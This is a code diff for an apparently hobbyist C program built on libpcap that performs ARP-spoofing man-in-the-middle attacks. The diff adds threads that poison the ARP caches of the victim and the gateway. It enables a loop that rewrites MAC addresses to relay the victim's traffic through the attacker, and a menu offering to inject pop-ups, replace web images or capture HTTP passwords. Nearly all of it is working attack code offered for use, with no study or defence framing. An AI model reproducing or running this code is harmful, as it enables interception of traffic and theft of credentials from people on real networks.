@@ -27,11 +27,17 @@ pthread_t thread1, thread2, thread3;
 int ret_thread1, ret_thread2, ret_thread3;
 /* end */
 
+/* send packet */
+void send_packet(pcap_t *handle, u_char *packet, int packetsize) {
+    if (pcap_sendpacket(handle, packet, packetsize) != 0)
+        printf("Packet send failed!\n");
+}
+
 void *startG(void *arg) {
     struct arg1 *real_arg = (struct arg1 *)arg;
     while (1) {
-        pcap_sendpacket(real_arg->handle, real_arg->packet, real_arg->size);
-        sleep(2);
+        send_packet(real_arg->handle, real_arg->packet, real_arg->size);
+        sleep(8);
     }
     pthread_exit(NULL);
 }
@@ -39,8 +45,8 @@ void *startG(void *arg) {
 void *startV(void *arg) {
     struct arg1 *real_arg = (struct arg1 *)arg;
     while (1) {
-        pcap_sendpacket(real_arg->handle, real_arg->packet, real_arg->size);
-        sleep(1);
+        send_packet(real_arg->handle, real_arg->packet, real_arg->size);
+        sleep(8);
     }
     pthread_exit(NULL);
 }
@@ -51,10 +57,23 @@ void *startF(void *arg) {
     ip_header *pIpv4 = (ip_header *)pEther->data;
     tcp_header *pTcp = (tcp_header *)pIpv4->data;
     if (!strncmp(pEther->SRC_mac, TARGET_MAC, 6) && !strncmp(pEther->DST_mac, ATTACKER_MAC, 6)) {
+        printf("Get a packet from victim.\n");
+        printf("Change my mac: ");
+        print_mac(pEther->DST_mac);
+        printf("to gateway's mac: ");
+        print_mac(GATEWAY_MAC);
         memcpy(pEther->DST_mac, GATEWAY_MAC, 6);
-        pcap_sendpacket(real_arg->handle, real_arg->packet, real_arg->size);
+        send_packet(real_arg->handle, real_arg->packet, real_arg->size);
     }
-
+    else if(!strncmp(pEther->SRC_mac, GATEWAY_MAC, 6) && !strncmp(pIpv4->dest_ip, TARGET_IP, 4)) {
+        printf("Get a packet from gateway reply\n");
+        printf("Change my mac: ");
+        print_mac(pEther->DST_mac);
+        printf("to victim's mac: ");
+        print_mac(TARGET_MAC);
+        memcpy(pEther->DST_mac, TARGET_MAC, 6);
+        send_packet(real_arg->handle, real_arg->packet, real_arg->size);
+    }
 }
 
 /* get gatway's mac */
@@ -103,12 +122,6 @@ u_char *dst_mac, u_char *dst_ip, u_char *src_mac, u_char *src_ip, u_short op) {
     memcpy(ARPpacket + sizeof(ehead), &ahead, sizeof(ahead));
 }
 
-/* send packet */
-void send_packet(pcap_t *handle, u_char *packet, int packetsize) {
-    if (pcap_sendpacket(handle, packet, packetsize) != 0)
-        printf("Packet send failed!\n");
-}
-
 int main(int argc, char const *argv[]) {
     
     /* definations */
@@ -134,7 +147,7 @@ int main(int argc, char const *argv[]) {
     addr_net.s_addr = net_addr;
     net = inet_ntoa(addr_net);
     printf("Opening device\n");
-    handle = pcap_open_live(dev, 65536, 1, 1000, errbuf);
+    handle = pcap_open_live(dev, 65536, 1, 1, errbuf);
     if (!handle) {
         printf("%s\n", errbuf);
         printf("If the Problem is \"you don't have permission\", please run this program as root!\n");
@@ -154,7 +167,7 @@ int main(int argc, char const *argv[]) {
 
     /* get gateway's mac */
     printf("Geting gateway's MAC\n");
-    char filter_app[] = "src 192.168.1.1";
+    char filter_app[100] = "src 192.168.1.1";
     pcap_compile(handle, &filter, filter_app, 0, *net);
     pcap_setfilter(handle, &filter);
     pcap_loop(handle, 1, getgateway, NULL);
@@ -176,32 +189,39 @@ int main(int argc, char const *argv[]) {
     loading();
 
     /* Attack */
-    printf("Attack!\n");
+    printf("Attack!\n\n");
     ret_thread1 = pthread_create(&thread1, NULL, (void *)startG, (void *)&gate_arg);
     ret_thread2 = pthread_create(&thread2, NULL, (void *)startV, (void *)&tar_arg);
 
     /* next step */
-    /*struct pcap_pkthdr *pkt_header;
+    struct pcap_pkthdr *pkt_header;
     u_char *pkt_data;
     printf("Please wait\n");
-    sleep(2);
+    sleep(3);
     printf("Now your victim's network has been broken !\n");
     printf("If you want to do something interesting, you can enter a number to choose mode.\n");
+    printf("Do nothing to keep the condition.\n");
     printf("\t1: Just \"repair\" his network\n");
     printf("\t2: Add a window which says \"Big Brother is watching you!\" when he open a web page.\n");
     printf("\t3: Change all the picture in his web page to HUAJI.\n");
     printf("\t4: Get his passward in http packet.\n");
     scanf(" %d", &choose);
+
+    /* four modes */
+    strcpy(filter_app, "");
+    pcap_compile(handle, &filter, filter_app, 0, *net);
+    pcap_setfilter(handle, &filter);
     while (1) {
-        if (pcap_next_ex(handle, &pkt_header, &pkt_data)) {
+        if (pcap_next_ex(handle, &pkt_header, &pkt_data) > 0) {
             pthread_t new_thread;
             forward_arg.handle = handle;
             forward_arg.packet = pkt_data;
             forward_arg.pkthdr = pkt_header;
-            forward_arg.size = sizeof(pkt_data);
+            forward_arg.size = pkt_header->caplen;
             pthread_create(&new_thread, NULL, (void *)startF, (void *)&forward_arg);
         }
-    }*/
+    }
+
     /* before end */
     pthread_join(thread2,NULL);
     pthread_join(thread3,NULL);
